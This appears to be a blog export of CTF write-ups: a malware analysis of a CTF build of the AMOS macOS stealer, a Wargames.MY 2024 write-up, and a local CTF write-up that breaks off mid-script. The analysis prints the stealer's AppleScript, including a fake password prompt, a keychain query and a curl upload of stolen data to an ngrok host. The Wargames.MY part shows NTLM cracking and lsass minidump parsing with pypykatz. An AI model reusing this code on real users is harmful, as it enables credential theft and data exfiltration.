[{"content":"","date":"6 February 2025","externalUrl":null,"permalink":"/","section":"","summary":"","title":"","type":"page"},{"content":"","date":"6 February 2025","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"6 February 2025","externalUrl":null,"permalink":"/tags/dfir-labs/","section":"Tags","summary":"","title":"DFIR Labs","type":"tags"},{"content":"This is a writeup on Famous AMOS CTF challenge. For this challenge we are given the description as follow:\nCortex XDR has been flagging alerts non-stop this Friday due to a suspicious file being downloaded by Zhu Yuan. Thankfully, my Wireshark was running so we managed to track down some of the malicious activity. It seems like the user received a malicious attachment from an unknown domain via email, and executed it in their machine.\nChallenge File Analysis # PCAP analysis # The challenge file given is a PCAP and we can see that there\u0026rsquo;s multiple attachment that can be extracted from the PCAP by looking at the received packets.\nLet\u0026rsquo;s export out all the objects.\nPCAP Objects analysis # BetaTest.pdf # The Game Downloader is the LegitLobsterGameDownloader.dmg and the Special Gift is bangboo.png.\nBangboo.png # An image of Safety bangboo\nJoinsystem (103kb) # {\u0026#34;files\u0026#34;:[\u0026#34;/home/kali/Desktop/lobsterman/joinsystem/out.zip\u0026#34;],\u0026#34;message\u0026#34;:\u0026#34;Files uploaded successfully\u0026#34;} Out.zip (766kb) # This seems to be a compressed file named out.zip due to the magic-byte PK, which we can decompress and investigate on the content.\nLegitLobsterGameDownloader.dmg # It is an Apple Disk Image File, which we can decompress later to further investigate on the content inside.\nAnalysis on Out.zip # Out.zip/ â”œâ”€â”€ tmp/ â”‚ â””â”€â”€ 3089/ â”‚ â”œâ”€â”€ File Grabber/ â”‚ â”‚ â””â”€â”€ BetaTest.pdf â”‚ â”œâ”€â”€ info â”‚ â”œâ”€â”€ keychain â”‚ â”œâ”€â”€ pwd â”‚ â””â”€â”€ username â””â”€â”€ flag.enc BetaTest.pdf: The same pdf attachment found in the PCAP\ninfo: Information about the machine hardware Vendor ID: 0x15ad Yes: 24-Bit Color (ARGB8888)F2C3870AB6fd715126e33f59ae7]Welcome to the Virtual Machine\nkeychain: OSX Keychain file\npwd: macos\nusername: macos\nflag.enc: The encrypted flag\nAnalysis on LegitLobsterGameDownloader.dmg # LegitLobsterGame/ â””â”€â”€ lobsterstealer lobsterstealer: MacOS binary\nUsing IDA, we can decompile the code. In the main function, we observe a long hexadecimal value and a shorter hexadecimal value being defined. These values are then passed as inputs to the rc4_decrypt function to retrieve the original value.\nRC4 Decrypt # To decrypt the original data, we have to extract the long hexadecimal value at aA37c59750ed63b and clean it up using CyberChef to be used.\nThere should be better way to do this, but here\u0026rsquo;s how I did it\nAfter that I used CyberChef to decrypt the encrypted data and the original malicious OSA Script can be found.\nEncrypt Flag function # Upon analyzing the malicious OSA script, the encryptFlag function appears to be responsible for encrypting the flag. At the end of the script, the input files and the output file used for the encryption process can be found.\non encryptFlag(sussyfile, inputFile, outputFile) set hexKey to (do shell script \u0026#34;md5 -q \u0026#34; \u0026amp; sussyfile) set hexIV to (do shell script \u0026#34;echo \\\u0026#34;\u0026#34; \u0026amp; hexKey \u0026amp; \u0026#34;\\\u0026#34; | rev\u0026#34;) do shell script \u0026#34;openssl enc -aes-128-cbc -in \u0026#34; \u0026amp; quoted form of inputFile \u0026amp; \u0026#34; -out \u0026#34; \u0026amp; quoted form of outputFile \u0026amp; \u0026#34; -K \u0026#34; \u0026amp; hexKey \u0026amp; \u0026#34; -iv \u0026#34; \u0026amp; hexIV end encryptFlag set sussyfile to \u0026#34;~/Downloads/bangboo.png\u0026#34; set inputFile to \u0026#34;/tmp/flag.png\u0026#34; set outputFile to \u0026#34;/tmp/flag.enc\u0026#34; encryptFlag(sussyfile, inputFile, outputFile) do shell script \u0026#34;cd /tmp \u0026amp;\u0026amp; zip -r out.zip \u0026#34; \u0026amp; writemind \u0026amp; \u0026#34; flag.enc\u0026#34; send_data(0) do shell script \u0026#34;rm -r \u0026#34; \u0026amp; writemind do shell script \u0026#34;rm /tmp/out.zip\u0026#34; do shell script \u0026#34;rm /tmp/flag.enc\u0026#34; The encryptFlag function accept in 3 arguments sussyfile, inputfile and outputfile.\nFrom the variable defined, we know that the sussyfile is set to bangboo.png, the image found in the PCAP earlier.\nThe output file flag.enc can also be found inside the Out.zip.\nEncryption method = AES-128-CBC\nkey = MD5 of bangboo.png\nIV = reverse MD5 of bangboo.png\nWith that we can use CyberChef to decrypt the encrypted flag and obtain the original flag.\nKey (MD5 hash of bangboo.png)\nIV (Reverse MD5 hash of bangboo.png)\nMalicious OSA Script # 1. Initialization and Setup # A random directory is created in /tmp/ (e.g., /tmp/\u0026lt;randomNumber\u0026gt;/) to store collected data. The variable writemind holds the path to this temporary directory. 2. System Information Collection # The script collects system information (e.g., software, hardware, and display details) using the system_profiler command. This information is saved to a file named info in the writemind directory. 3. Password Retrieval # The script attempts to retrieve the user\u0026rsquo;s password: If the password is cached, it retrieves it silently. If not, it prompts the user with a dialog box asking for their password. The entered password is saved to a file named pwd in the writemind directory. *The collected password can then be used to decrypt the OSX Keychain * on getpwd(username, writemind) try if checkvalid(username, \u0026#34;\u0026#34;) then set result to do shell script \u0026#34;security 2\u0026gt;\u0026amp;1 \u0026gt; /dev/null find-generic-password -ga \\\u0026#34;Chrome\\\u0026#34; | awk \\\u0026#34;{print $2}\\\u0026#34;\u0026#34; writeText(result as string, writemind \u0026amp; \u0026#34;masterpass-chrome\u0026#34;) else repeat set result to display dialog \u0026#34;Required Application Helper.\\nPlease enter password for continue.\u0026#34; default answer \u0026#34;\u0026#34; with icon caution buttons {\u0026#34;Continue\u0026#34;} default button \u0026#34;Continue\u0026#34; giving up after 150 with title \u0026#34;System Preferences\u0026#34; with hidden answer set password_entered to text returned of result if checkvalid(username, password_entered) then writeText(password_entered, writemind \u0026amp; \u0026#34;pwd\u0026#34;) return password_entered end if end repeat end if end try return \u0026#34;\u0026#34; end getpwd 4. File and Data Collection # a. Browser Data Collection\nChromium-Based Browsers : The script iterates over a list of Chromium-based browsers (e.g., Chrome, Brave, Edge, Opera, etc.) and collects sensitive files such as: Cookies Login Data Web Data IndexedDB Local Extension Settings It uses the grabPlugins function to handle IndexedDB and Local Extension Settings for specific plugins. Firefox-Based Browsers : The script collects data from Firefox, Waterfox, and Pale Moon profiles, including: Cookies Form history Key database (key4.db) Login data (logins.json) This data is saved in a subdirectory named ff/. b. Wallet Data Collection\nDesktop Wallets : The script collects data from various cryptocurrency wallets, including: Electrum Coinomi Exodus Atomic Wasabi Ledger Live Monero Bitcoin Core Litecoin Core Dash Core Trezor Suite Wallet data is saved in a subdirectory named deskwallets/. c. Telegram Data Collection\nTelegram Desktop : The script collects data from the Telegram Desktop application, specifically targeting the tdata/ directory, which contains chat history and other sensitive information. This data is saved in a subdirectory named Telegram Data/. d. File Grabber\nFileGrabber Functionality : The script searches for files with specific extensions (e.g., .pdf, .docx, .wallet, .keys) in the user\u0026rsquo;s Desktop, Documents, and Downloads folders. Files are copied to a subdirectory named FileGrabber/ if their total size does not exceed 10 MB. Additional files like Safari cookies (Cookies.binarycookies) and Apple Notes data (NoteStore.sqlite) are also collected. 5. Keychain and Notes Data # Keychain Access : The script copies the macOS login keychain (login.keychain-db) to the writemind directory. Apple Notes : The script collects Apple Notes data (NoteStore.sqlite and related files) and saves them in the FileGrabber/ directory. 6. Sending Collected Data # Sending Data to C2 : The script attempts to send the collected data to a remote server using an HTTP POST request via curl. The data is sent as a ZIP file (out.zip) containing all the collected files. If the transmission fails, the script retries up to 40 times with a delay of 3 seconds between attempts. on send_data(attempt) try set result_send to do shell script \u0026#34;curl -X POST -H \\\u0026#34;user: 85JDXWQ4CL67-XaZnPqOLmHFv1yNRXZOmNTpeJMw4AP=\\\u0026#34; -H \\\u0026#34;BuildID: /xpLmzYqPrVH-jKOpfmncviXt2zDgp/-NFM7tQhb6tp=\\\u0026#34; --max-time 300 --retry 5 --retry-delay 10 -F \\\u0026#34;file1=@/tmp/out.zip\\\u0026#34; http://b2eb-115-135-31-192.ngrok-free.app/joinsystem\u0026#34; on error if attempt \u0026lt; 40 then delay 3 send_data(attempt + 1) end if end try end send_data 7. Cleanup # Temporary Files Removal : After the data is sent, the script performs cleanup by: Deleting the temporary directory (writemind). Removing the ZIP file (out.zip) and encrypted flag file (flag.enc) from /tmp/. Shoutout to the author of this challenge:\nwarlocksmurf ","date":"6 February 2025","externalUrl":null,"permalink":"/posts/lobsterstealer/","section":"Posts","summary":"Malware analysis of the CTF version AMOS stealer","title":"Lobster Stealer - Malware Analysis","type":"posts"},{"content":"","date":"6 February 2025","externalUrl":null,"permalink":"/tags/malware-analysis/","section":"Tags","summary":"","title":"malware analysis","type":"tags"},{"content":"","date":"6 February 2025","externalUrl":null,"permalink":"/categories/malware-analysis/","section":"Categories","summary":"","title":"malware analysis","type":"categories"},{"content":"","date":"6 February 2025","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"6 February 2025","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"29 December 2024","externalUrl":null,"permalink":"/tags/ctf/","section":"Tags","summary":"","title":"ctf","type":"tags"},{"content":"","date":"29 December 2024","externalUrl":null,"permalink":"/categories/ctf/","section":"Categories","summary":"","title":"ctf","type":"categories"},{"content":" Crypto # Credentials # We found a leak of a blackmarket website\u0026rsquo;s login credentials. Can you find the password of the user osman and successfully decrypt it?\nHint: The first user in user.txt corresponds to the first password in passwords.txt\nFlag: WGMY{b6d180d9c302d8a8daad1f2174a0b212}\nFor this challenge there are 2 files provided passwd.txt and user.txt. user.txt\nosman passwd.txt\nZJPB{e6g180g9f302g8d8gddg1i2174d0e212} I search for user osman from the user.txt which appeared on line 337. On the passwd.txt file\u0026rsquo;s line 337, I found the corresponding password for the user osman which is ZJPB{e6g180g9f302g8d8gddg1i2174d0e212}.\nThis password appears to be encoded using ROT13. To decode it, I used CyberChef ROT13 Brute Force to decode it, with the known plaintext of wgmy.\nForensic # I Cant Manipulate People # Partial traffic packet captured from hacked machine, can you analyze the provided pcap file to extract the message from the packet perhaps by reading the packet data?\nHint: Attacker too noob to ping not in sequence\nFlag: WGMY{1e3b71d57e466ab71b43c2641a4b34f4}\nGiven a traffic.pcap file, it can be observed in Wireshark that the source is sending a large number of ping requests to 192.168.0.1 with the following information: Echo (ping) request id=0x0000, seq=0/0, ttl=64 (no response found!). By examining the packet, we see that the data section of each packet consists of only 1 byte.\nTo filter and view only ICMP Echo requests, apply the filter icmp.type == 8. Then, modify the protocol preferences by right-clicking on any packet and selecting Protocol Preferences \u0026gt; Data \u0026gt; Show Data as Text. This will display the entire data section of the ping packet, where the flag is visible.\nAn alternative way to obtain the flag is by using Tshark. The following command can be run in the terminal:\ntshark -r traffic.pcap -Y \u0026#34;icmp.type == 8\u0026#34; -T fields -e data | xxd -r -p Oh Man # We received a PCAP file from an admin who suspects an attacker exfiltrated sensitive data. Can you analyze the PCAP file and uncover what was stolen?\nZip Password: wgmy\nHint: Investigate the tool used by the attacker\nFlag: wgmy{fbba48bee397414246f864fe4d2925e4}\nWe are given a PCAP file containing encrypted SMB traffic. Our goal is to decrypt the SMB traffic in order to obtain the transferred file. After researching online, I found this write-up that explains how to decrypt SMB traffic.\nWhat We Need to Decrypt the SMB Traffic To decrypt the traffic from the PCAP file, we need the following information:\nDomain Username Password/NTLM Hash (can be cracked) NTProofStr NTLM Server Challenge Encrypted Session Key Session ID 1. Obtain the data from the Session Setup Packet # From the Session Setup Request, NTLMSSP_AUTH packet, we can extract the following data:\nDomain: DESKTOP-PMNU0JK Username: Administrator Encrypted Session Key: 12140eb776cb74a339c9c75b152c52fd Next, we extract the NTProofStr and the remaining NTLM Response Data:\nNTProofStr: ae62a57caaa5dd94b68def8fb1c192f3 Remaining NTLM Response Data: 01010000000000008675779b2e57db01376f686e57504d770000000002001e004400450053004b0054004f0050002d0050004d004e00550030004a004b0001001e004400450053004b0054004f0050002d0050004d004e00550030004a004b0004001e004400450053004b0054004f0050002d0050004d004e00550030004a004b0003001e004400450053004b0054004f0050002d0050004d004e00550030004a004b00070008008675779b2e57db010900280063006900660073002f004400450053004b0054004f0050002d0050004d004e00550030004a004b000000000000000000 Session ID: 65000000000c0000 To convert this, use CyberChef to swap the endianness. From the Session Setup Response, NTLMSSP_CHALLENGE packet, we obtain the NTLM Server Challenge:\nNTLM Server Challenge: 7aaff6ea26301fc3 2. Crack the Password Using the NTLM Data # Now that we have all the required data, we can construct the hash to crack the password using HashCat. The format is:\nUsername::Domain:NTLMServerChallenge:NTProofStr:RemainingNTLMResponseData Hash\nAdministrator::DESKTOP-PMNU0JK:7aaff6ea26301fc3:ae62a57caaa5dd94b68def8fb1c192f3:01010000000000008675779b2e57db01376f686e57504d770000000002001e004400450053004b0054004f0050002d0050004d004e00550030004a004b0001001e004400450053004b0054004f0050002d0050004d004e00550030004a004b0004001e004400450053004b0054004f0050002d0050004d004e00550030004a004b0003001e004400450053004b0054004f0050002d0050004d004e00550030004a004b00070008008675779b2e57db010900280063006900660073002f004400450053004b0054004f0050002d0050004d004e00550030004a004b000000000000000000 Once the hash is constructed, you can use HashCat to crack the password. The cracked password is password\u0026lt;3.\n3. Obtain the Random Session Key # With the data obtained from the packet and the cracked password, we can calculate the random session key using the following Python script: Get Random Session Key.py\nimport hashlib import hmac import argparse try: from Cryptodome.Cipher import ARC4 from Cryptodome.Cipher import DES from Cryptodome.Hash import MD4 except Exception: print(\u0026#34;Warning: You don\u0026#39;t have any crypto installed. You need pycryptodomex\u0026#34;) print(\u0026#34;See https://pypi.org/project/pycryptodomex/\u0026#34;) def generateEncryptedSessionKey(keyExchangeKey, exportedSessionKey): cipher = ARC4.new(keyExchangeKey) cipher_encrypt = cipher.encrypt sessionKey = cipher_encrypt(exportedSessionKey) return sessionKey parser = argparse.ArgumentParser(description=\u0026#34;Calculate the Random Session Key based on data from a PCAP (maybe).\u0026#34;) parser.add_argument(\u0026#34;-u\u0026#34;, \u0026#34;--user\u0026#34;, required=True, help=\u0026#34;User name\u0026#34;) parser.add_argument(\u0026#34;-d\u0026#34;, \u0026#34;--domain\u0026#34;, required=True, help=\u0026#34;Domain name\u0026#34;) parser.add_argument(\u0026#34;-p\u0026#34;, \u0026#34;--password\u0026#34;, required=True, help=\u0026#34;Password of User\u0026#34;) parser.add_argument(\u0026#34;-n\u0026#34;, \u0026#34;--ntproofstr\u0026#34;, required=True, help=\u0026#34;NTProofStr. This can be found in PCAP (provide Hex Stream)\u0026#34;) parser.add_argument(\u0026#34;-k\u0026#34;, \u0026#34;--key\u0026#34;, required=True, help=\u0026#34;Encrypted Session Key. This can be found in PCAP (provide Hex Stream)\u0026#34;) parser.add_argument(\u0026#34;-v\u0026#34;, \u0026#34;--verbose\u0026#34;, action=\u0026#34;store_true\u0026#34;, help=\u0026#34;increase output verbosity\u0026#34;) args = parser.parse_args() user = str(args.user).upper().encode(\u0026#39;utf-16le\u0026#39;) domain = str(args.domain).upper().encode(\u0026#39;utf-16le\u0026#39;) # Create \u0026#39;NTLM\u0026#39; Hash of password passw = args.password.encode(\u0026#39;utf-16le\u0026#39;) hash1 = hashlib.new(\u0026#39;md4\u0026#39;, passw) password = hash1.digest() # Calculate the ResponseNTKey h = hmac.new(password, digestmod=hashlib.md5) h.update(user + domain) respNTKey = h.digest() # Use NTProofSTR and ResponseNTKey to calculate Key Exchange Key NTproofStr = bytes.fromhex(args.ntproofstr) h = hmac.new(respNTKey, digestmod=hashlib.md5) h.update(NTproofStr) KeyExchKey = h.digest() # Calculate the Random Session Key by decrypting Encrypted Session Key with Key Exchange Key via RC4 RsessKey = generateEncryptedSessionKey(KeyExchKey, bytes.fromhex(args.key)) if args.verbose: print(\u0026#34;USER WORK: \u0026#34; + user.decode(\u0026#39;utf-16le\u0026#39;) + \u0026#34; \u0026#34; + domain.decode(\u0026#39;utf-16le\u0026#39;)) print(\u0026#34;PASS HASH: \u0026#34; + password.hex()) print(\u0026#34;RESP NT: \u0026#34; + respNTKey.hex()) print(\u0026#34;NT PROOF: \u0026#34; + NTproofStr.hex()) print(\u0026#34;KeyExKey: \u0026#34; + KeyExchKey.hex()) print(\u0026#34;Random SK: \u0026#34; + RsessKey.hex()) Running the script with the correct parameters gives us the Random Session Key: 4147454a48564a4373437649574e504c\n4. Decrypt the SMB Traffic in WireShark # To decrypt the SMB traffic in Wireshark: Go to Edit \u0026gt; Preferences \u0026gt; Protocols \u0026gt; SMB2 \u0026gt; Secret session keys for decryption \u0026gt; Edit\n5. Extract the files # Once decrypted, we can extract the files using: File \u0026gt; Export Objects \u0026gt; SMB \u0026gt; Save All\n6. Analyze the Extracted Files # wqpiZo\n\u0026#34;lsass.exe\u0026#34;,\u0026#34;840\u0026#34;,\u0026#34;Services\u0026#34;,\u0026#34;0\u0026#34;,\u0026#34;24,332 K\u0026#34;,\u0026#34;Unknown\u0026#34;,\u0026#34;NT AUTHORITY\\SYSTEM\u0026#34;,\u0026#34;0:00:00\u0026#34;,\u0026#34;N/A\u0026#34; RxHmEj\nThe minidump has an invalid signature, restore it running: scripts/restore_signature 20241225_1939.log Done, to get the secretz run: python3 -m pypykatz lsa minidump 20241225_1939.log python3 -m pypykatz lsa minidump 20241225_1939.log 20241225_1939.log nano.exe This is identified as nanodump.exe from VirusTotal Scan, which can be found on GitHub.\nNow we know that the 20241225_1939.log can be used to get the minidump, then the next step is to restore the log file as the signature seems to be invalid MiniDump log file.\nThe method I used to restore is by downloading the scripts/restore_signature from the NanoDump\u0026rsquo;s GitHub and run the script on the log file.\n7. Get the flag # The flag can be obtained by running the pypykatz module and read the mini dump.\nUnwanted Meow # Uh.. Oh.. Help me, I just browsing funny cats memes, when I click download cute cat picture, the file that been download seems little bit wierd. I accidently run the file making my files shredded. Ughh now I hate cat meowing at me.\nHint: We don\u0026rsquo;t want meow here.\nFlag: WGMY{4a4be40c96ac6314e91d93f38043a634}\nWe are given a file named flag.shredded, which is a JPEG image file, but it appears to be corrupted.\nAfter opening the file in a text editor, it can be seen that the word meow is repeatedly placed throughout the file. To recover the image, I removed the meow entries and then added the .jpeg extension to the file. After this, the recovered image is still partially corrupted. To repair it, I used JPEG Medic to fix the image.\nAfter tinkering with JPEG Medic for a while, I was able to see part of the flag, even though the image was not fully recovered. The flag was visible in the partially restored image.\nUpon reviewing other writeups for this challenge, I realized that the intended solution was actually hidden in plain sight, which I had not noticed earlier. Instead of repairing the image, the flag could have been obtained simply by removing the additional meow entries and viewing the image directly.\nAfter removing the second set of meow entries, the image was fully recovered, and the flag can be successfully obtained.\nMisc # The DCM Meta # [25, 10, 0, 3, 17, 19, 23, 27, 4, 13, 20, 8, 24, 21, 31, 15, 7, 29, 6, 1, 9, 30, 22, 5, 28, 18, 26, 11, 2, 14, 16, 12]\nHint: The element is the number in the list, combine for the flag. Wrap in wgmy{}\nFlag: WGMY{51fadeb6cc77504db336850d53623177}\nWe are given a file with a .dcm extension, but the file itself only contains data.\nI used CyberChef to extract all the words. From the indices provided in the description, the largest index is 31, which indicates that the data can only have 32 characters. Therefore, I also removed the padding WGMY. The extracted data is: f63acd3b78127c1d7d3e700b55665354\nNext, to obtain the actual flag, we use the indices provided in the challenge description: [25, 10, 0, 3, 17, 19, 23, 27, 4, 13, 20, 8, 24, 21, 31, 15, 7, 29, 6, 1, 9, 30, 22, 5, 28, 18, 26, 11, 2, 14, 16, 12]\nBy following these indices, we can rearrange the characters in the extracted string. To automate this process, I create a Python script: flag.py\nelement = \u0026#34;f63acd3b78127c1d7d3e700b55665354\u0026#34; indices = [25, 10, 0, 3, 17, 19, 23, 27, 4, 13, 20, 8, 24, 21, 31, 15, 7, 29, 6, 1, 9, 30, 22, 5, 28, 18, 26, 11, 2, 14, 16, 12] result = \u0026#39;\u0026#39;.join([element[i] for i in indices]) print(\u0026#34;WGMY{\u0026#34;+result+\u0026#34;}\u0026#34;) Fun Fact: I asked ChatGPT to help me rearrange the extracted string using the indices provided. Unfortunately, I trusted ChatGPT without verifying the result, as it turns out, the output it provided was incorrect. Lesson learned: don\u0026rsquo;t trust ChatGPT too much ðŸ˜‚\n","date":"29 December 2024","externalUrl":null,"permalink":"/posts/wargamesmy2024/","section":"Posts","summary":"This is a CTF writeup for Wargames.MY 2024, it is a prestigous local CTF that I look forward every year.","title":"Wargames.MY 2024 - Writeup","type":"posts"},{"content":" Crypto # Mesej Rahsia # Tak susah pun, run je script\nFlag: 3108{substitute_cipher_text}\nFor this challenge, we are given a python script. secretMessenger.py\na,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z=\u0026#39;j\u0026#39;,\u0026#39;b\u0026#39;,\u0026#39;a\u0026#39;,\u0026#39;c\u0026#39;,\u0026#39;m\u0026#39;,\u0026#39;n\u0026#39;,\u0026#39;i\u0026#39;,\u0026#39;p\u0026#39;,\u0026#39;o\u0026#39;,\u0026#39;q\u0026#39;,\u0026#39;r\u0026#39;,\u0026#39;t\u0026#39;,\u0026#39;x\u0026#39;,\u0026#39;z\u0026#39;,\u0026#39;v\u0026#39;,\u0026#39;s\u0026#39;,\u0026#39;u\u0026#39;,\u0026#39;y\u0026#39;,\u0026#39;h\u0026#39;,\u0026#39;g\u0026#39;,\u0026#39;d\u0026#39;,\u0026#39;e\u0026#39;,\u0026#39;f\u0026#39;,\u0026#39;k\u0026#39;,\u0026#39;l\u0026#39;,\u0026#39;w\u0026#39; flag=((3108,\u0026#34;{\u0026#34;,p,q,b,p,l,g,l,q,l,v,\u0026#34;_\u0026#34;,d,g,h,s,v,k,\u0026#34;_\u0026#34;,l,v,m,l,\u0026#34;}\u0026#34;)[::-1]) From the script we can see there\u0026rsquo;s the flag variable set to the predefined variables in reverse.\nThen what we can do is remove the slice notation and join the flag and print it out. Solution.py\na,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z=\u0026#39;j\u0026#39;,\u0026#39;b\u0026#39;,\u0026#39;a\u0026#39;,\u0026#39;c\u0026#39;,\u0026#39;m\u0026#39;,\u0026#39;n\u0026#39;,\u0026#39;i\u0026#39;,\u0026#39;p\u0026#39;,\u0026#39;o\u0026#39;,\u0026#39;q\u0026#39;,\u0026#39;r\u0026#39;,\u0026#39;t\u0026#39;,\u0026#39;x\u0026#39;,\u0026#39;z\u0026#39;,\u0026#39;v\u0026#39;,\u0026#39;s\u0026#39;,\u0026#39;u\u0026#39;,\u0026#39;y\u0026#39;,\u0026#39;h\u0026#39;,\u0026#39;g\u0026#39;,\u0026#39;d\u0026#39;,\u0026#39;e\u0026#39;,\u0026#39;f\u0026#39;,\u0026#39;k\u0026#39;,\u0026#39;l\u0026#39;,\u0026#39;w\u0026#39; flag=\u0026#34;\u0026#34;.join(str(i) for i in (3108,\u0026#34;{\u0026#34;,p,q,b,p,l,g,l,q,l,v,\u0026#34;_\u0026#34;,d,g,h,s,v,k,\u0026#34;_\u0026#34;,l,v,m,l,\u0026#34;}\u0026#34;)) print(flag) Syah Sesat # Semasa Syah berada di Muzium Kota Kayang, dia telah menyaksikan sebuah persembahan Gambus yang dipersembahkan oleh seorang pemuzik dari Sabah yang berkunjung ke muzium tersebut. Lagu yang dipersembahkan ketika itu bertajuk Ampuk Ampuk Bulan. Kagum akan persembahan tersebut, beliau telah meninggalkan satu pesanan di bawah bersama kunci. Bolehkan anda merungkaikan pesanan tersebut dan mendapatkan Flag?\nCipher : }AYPF_KYMSOL_TOMMNG{8013EJVWASCUQOYOAGNURBETMYUIBMTNHGMALKGZTXUBDPS Key : AMPUKAMPUKBULAN\nFlag: 3108{GAMBUS_BUDAYA_LAMA}\nFor this challenge, we are given a cipher text and a key. Cipher Text\n}AYPF_KYMSOL_TOMMNG{8013EJVWASCUQOYOAGNURBETMYUIBMTNHGMALKGZTXUBDPS Key\nAMPUKAMPUKBULAN Given the cipher text and key, using CyberChef I tried to decode it using VigenÃ¨re cipher and the output was noticeably reversed. So I reverse it and the flag can be seen.\nTanpa Nama 3 # Flag: 3108{S1MPL3_CRPYT0_CHALLENGE}\nFor this challenge we are given a python script. cryptochalle.py\ndef xor_with_binary(binary_str, xor_str): binaries = binary_str.split() xor_num = int(xor_str, 2) xor_results = [] for b in binaries: num = int(b, 2) result_num = num ^ xor_num xor_results.append(format(result_num, \u0026#39;08b\u0026#39;)) return \u0026#39; \u0026#39;.join(xor_results) binary_str = \u0026#34;01010110 01010100 01010101 01011101 00011110 00110110 01010100 00101000 00110101 00101001 01010110 00111010 00100110 00110111 00110101 00111100 00110001 01010101 00111010 00100110 00101101 00100100 00101001 00101001 00100000 00101011 00100010 00100000 00011000\u0026#34; xor_str = \u0026#34;01100101\u0026#34; The function is XORing the binary_str with xor_str, what I did was place the arguments with the variables provided and print the output. Which I throw into CyberChef and convert the binary string.\nzZzZz # ZZZZZ ZZZzZ ZZZZZ ZZZZZ ZzZZz ZZZZ ZZZ ZZ ZZZZZ ZZzZZ ZZzZZ ZzZZ ZZZZZZ ZZzZZ\nFlag: 3108{700ef4a79959615b67ea5297e725c06e}\nWe were asked who the name of the Laksamana that killed Sultan Mahmud in 1699 and quick google search says that its Laksamana Bentan and submitting the answer shows the hex string. Hex string\n0x33z0x31z0x30z0x380x7bz0x37z0x30z0x30z0x650x66z0x34z0x61z0x37z0x39z0x39z0x350x39z0x360x31z0x350x62z0x360x37z0x650x61z0x35z0x32z0x39z0x37z0x65z0x37z0x32z0x350x63z0x300x36z0x65z0x7dz Using CyberChef to convert the hex will show us the flag Forensic # Daerah Sabah \u0026amp; Sarawak # Setiap negeri mempunyai daerah. Begitu juga negeri Sabah dan Sarawak mempunyai daerah tersendiri. Cari \u0026lsquo;flag\u0026rsquo; yang mengandungi bilangan daerah Sabah dan Sarawak di dalam file tersebut.\nFlag: 3108{S4B4H_27_D43RAH_S4R4W4K_40_D43R4H} We are given a zip file\nThen I proceed to unzip the zip file and obtained 3 jpg file.\nThese images does not show anything, so I tried to use Stegoveritas to extract the 3.jpg because it feels weird to have AI generated image to mix with the rest normal looking images. Also the file size seems to be larger than the rest that might indicate something is hidden within the image itself.\nStegoveritas managed to find an archived file hidden in the 3.jpg extracted the file out. I checked the file and it\u0026rsquo;s a RAR archive file, I then proceed to extract the file and obtained a text file and a zip file. The Daerah_Sabah\u0026amp;Sarawak.txt contains the names of all the Town and City in Sabah and Sarawak. The file.zip however is AES encrypted. Which got me thinking that the given text file might be the wordlist that can be use for bruteforce. The password can be obtained by using zip2john and run JohnTheRipper using the wordlist above. After extracting the file, the flag can be obtained.\nKontras # Sekarang anda tidak dapat membaca dengan betul. Sejarah ringkas ini mempunyai beberapa data kritikal di dalamnya, beberapa daripadanya telah disunting dengan betul, manakala ada yang tidak. Bolehkah anda mencari kunci penting yang tidak disunting dengan betul?\nFlag: 3108{Peghak_Darul_ridzuAn}\nWe are given a PDF file that seems to have redacted words. However, the PDF is not properly redacted and the text can still be highlighted and copied (which is not supposed to happen) I just copied the whole text to notepad and find the keyword 3108{\nLahad Datu # Scott seorang bangsa Melayu kacukan darah British ingin mengetahui peristiwa hitam yang berlaku di Sabah yang ada di dalam dokumen \u0026ldquo;Lahad Datu\u0026rdquo;. Tetapi dokumen tersebut mempunyai kata laluan. Bantu Scott untuk membuka dokumen berkenaan.\nFlag: 3108{0P3R4S1_D4UL4T}\nWe are given an encrypted Word document.\nWithout any hint given, I tried to brute-force the password using JohnTheRipper with common wordlist. The brute-force process was rather quick and I used the password to open the Word document. There\u0026rsquo;s the flag at the bottom, but is it the real flag? Seems like gibberish to me, hence I notice the JamalulKiramIII that was bolded and thought that it might be used to decode the flag. So I go over to trusty CyberChef and used the VigenÃ¨re module to decode the flag. Pahlawan Lagenda # Penyerang telah mencuba merosakkan dan menyembunyikan sesuatu di dalam data hikayat Hang Tuah yang sangat besar pada masa lalu, mungkin mereka masih melakukannya. Muat turun data di sini.\nFlag: 3108{gr3p_15_@w3s0m3_l4ks4m4n4}\nWe are given a text file which is full of text, so I go ahead and CTRL+F the flag keyword 3108{ The flag can be obtained.\nLinux # Cer Cari # Setiap negeri mempunyai tarikh penting. CerCari Tarikh penting bagi negeri Sabah.\nFlag: 3108{S4b4h_1963}\nWe are given a file with a bunch of strings with the flag format. However the hint is given in the description saying it\u0026rsquo;s an important date for Sabah. Which got me thinking what could be more important than 1963 (formation of Malaysia).\nGrepping the keyword 1963 shows a match, which means the flag might be correct and it is indeed correct.\nMakanan Popular # Sarawak mempunyai pelbagai makanan tradisional yang menarik. Cuba cari makanan tradisional yang popular di Sarawak di dalam file yang disediakan.\nFlag: 3108{L4KS4_S4R4W4K}\nWe are given an ELF executable file.\nHence, I tried running the file and got an output saying that I should try using strings. Which means that the flag can be grep.\nAnd we got my favourite food Laksa Sarawak!\nReverse # Asal Nama Sabah # Setiap negeri mempunyai asal nama negeri tersebut. Begitu juga dengan negeri Sabah. Sabah juga mempunyai nama asal negeri tersebut yang popular di kalangan masyarakat tempatan.\nFlag: 3108{S4B4H_S4PP4H}\nWe are given an executable file for this challenge. I go ahead and throw the file to DogBolt(great platform to test various decompilers). After decompiling, I chose the Hex-Rays decompiler as it seems to be more readable.\nThe function that we should put our focus on is this check_flag function.\nBasically the each character from s2 will be XORed with each character from s. With that I used ChatGPT to help me craft the script to decode the flag. Solution.py\ns = \u0026#34;namaasalsabah\u0026#34; s2 = \u0026#34;5d505d591a20552e47293d325c3e3159291c\u0026#34; v4 = len(s) #13 # Convert hex string to a list of integers s2_bytes = [int(s2[i:i+2], 16) for i in range(0, len(s2), 2)] # XOR with corresponding characters from s decoded_bytes = [s2_bytes[i] ^ ord(s[i % v4]) for i in range(len(s2_bytes))] # Convert decoded bytes back to a string decoded_string = \u0026#39;\u0026#39;.join(chr(b) for b 